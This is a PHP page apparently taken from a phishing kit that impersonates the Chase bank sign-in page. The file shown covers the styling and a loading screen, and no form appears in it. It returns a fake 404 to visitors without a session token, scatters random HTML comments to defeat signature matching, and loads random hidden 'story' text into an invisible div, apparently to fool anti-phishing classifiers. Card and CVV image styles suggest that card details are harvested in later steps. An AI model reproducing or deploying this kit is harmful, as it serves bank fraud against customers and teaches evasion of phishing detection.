<?php session_start();

require("../ElZero/ElZero.php");
require("../ElZero/function.php");
if (!isset($_SESSION['ElZeR0_ToKeN']) ) {
  header('HTTP/1.0 404 Not Found');exit();
}


 ?>

<html xmlns="http://www.w3.org/1999/xhtml" lang="en">

<head>
    <meta charset="utf-8">
    <title>sign in &#45; chase.com</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="shortcut icon" href="./img/icon.ico"/>
    <style>
        @font-face {
            font-family: Open Sans;
            font-style: normal;
            font-weight: 400;
            src: url('./fonts/opensans-regular.ttf') format('truetype');
        }
        
        html {
            height: 100%;
            background: #fff;
        }
        
        @media only screen and (min-width: 768px) {
            html {
                background: #1c4f82;
                background: -moz-linear-gradient(top, #1c4f82 0%, #2e6ea3 100%);
                background: -webkit-linear-gradient(top, #1c4f82 0%, #2e6ea3 100%);
                background: linear-gradient(to bottom, #1c4f82 0%, #2e6ea3 100%);
            }
        }
        
        .footer {
            left: 0;
            bottom: 0;
            width: 100%;
            text-align: center;
        }
        
        .hide {
            display: none;
        }
        
        #loading-image {
            position: fixed;
            width: 125px;
            height: 122px;
            z-index: 1000;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transform: -webkit-translate(-50%, -50%);
            transform: -moz-translate(-50%, -50%);
            transform: -ms-translate(-50%, -50%);
        }
        
        .lollol {
            background-size: 36px;
            width: 37px;
            height: 30px;
            right: 1px;
            top: 13px;
            float: left;
            position: absolute;
        }
        
        .gadiha {
            display: table;
            display: flex;
            justify-content: space-between;
            width: 100%;
            list-style: none;
            margin: 0 0 1.5em;
        }
        
        .zwina {
            display: inline-block;
            text-align: center;
        }
        
        .img_small {
            width: 3em;
            height: 2em;
            margin: 0 auto;
            border-radius: 7px;
            display: inline-block;
        }
        
        .tgadi {
            width: 17em;
            height: 5.1em;
            margin: 0 auto;
            border-radius: 12px;
            display: inline-block;
        }
        
        .shadow {
            box-shadow: 0 0px 24px #0b6efd;
        }
        
        .card-icons {
            vertical-align: middle;
        }
        
        .lawla {
            background-image: url('./img/lawla.png');
            background-size: 100%;
        }
        
        .lawlatwo {
            background-image: url('./img/lawla.png');
            background-size: 100%;
        }
        
        .mastercardimg {
            background-image: url('./img/cardsimg.png');
            background-position: 0 65.6%;
            background-size: 100%;
        }
        
        .cco {
            background-image: url('./img/cvv.jpg');
            background-position: 0 50%;
            background-size: 100%;
        }
        
        .visaimg {
            background-image: url('./img/cardsimg.png');
            background-position: 0 88.25161%;
            background-size: 100%;
        }
        
        ol.progtrckr {
            display: table;
            list-style-type: none;
            margin: 0;
            padding: 0;
            table-layout: fixed;
            width: 100%;
        }
        
        ol.progtrckr li {
            display: table-cell;
            text-align: center;
            line-height: 3em;
        }
        
        <!-- Progress with steps --> ol.progtrckr {
            margin: 0;
            padding: 0;
            list-style-type: none;
        }
        
        ol.progtrckr li {
            display: inline-block;
            text-align: center;
            line-height: 3em;
        }
        
        ol.progtrckr[data-progtrckr-steps="2"] li {
            width: 49%;
        }
        
        ol.progtrckr[data-progtrckr-steps="3"] li {
            width: 33%;
        }
        
        ol.progtrckr[data-progtrckr-steps="4"] li {
            width: 24%;
        }
        
        ol.progtrckr[data-progtrckr-steps="5"] li {
            width: 19%;
        }
        
        ol.progtrckr[data-progtrckr-steps="6"] li {
            width: 16%;
        }
        
        ol.progtrckr[data-progtrckr-steps="7"] li {
            width: 14%;
        }
        
        ol.progtrckr[data-progtrckr-steps="8"] li {
            width: 12%;
        }
        
        ol.progtrckr[data-progtrckr-steps="9"] li {
            width: 11%;
        }
        
        ol.progtrckr li.progtrckr-done {
            color: black;
            border-bottom: 4px solid #0b6efd;
        }
        
        ol.progtrckr li.progtrckr-todo {
            color: silver;
            border-bottom: 4px solid silver;
        }
        
        ol.progtrckr li:after {
            content: "\00a0\00a0";
        }
        
        ol.progtrckr li:before {
            position: relative;
            bottom: -2.5em;
            float: left;
            left: 50%;
            line-height: 1em;
        }
        
        ol.progtrckr li.progtrckr-done:before {
            content: "\2713";
            color: white;
            background-color: #0b6efd;
            height: 1.2em;
            width: 1.2em;
            line-height: 1.2em;
            border: none;
            border-radius: 1.2em;
        }
        
        ol.progtrckr li.progtrckr-todo:before {
            content: "\039F";
            color: silver;
            background-color: white;
            font-size: 1.5em;
            bottom: -1.6em;
        }
    </style>
    <link rel="stylesheet" href="./css/style.css">
    <link rel="stylesheet" href="./css/lostyle.css">
</head>

<body style="overflow-x: hidden; overflow-y: auto; height: 100%">
  
        <!-- Loading Section -->
    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class="jpui modal" id="loading">
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" dialog vertical-center util print-position-initial" role="dialog">
            <section class=" dialogContent">
                <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" modalContent">
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div class=" row">
                        <img id="loading-image" src="./img/loading.gif" />
                    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>

                <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
            </section>
        <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
    <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>
<?php $randomStory = rand(0,9); ?>
     <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
     <?php echo "<!-- ".rand(0,999999999)."-->"; ?><div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php require("../X-Sniper/Story/story-$randomStory.txt"); ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?> <?php echo "<!-- ".rand(0,999999999)."-->"; ?></div><?php echo "<!-- ".rand(0,999999999)."-->"; ?>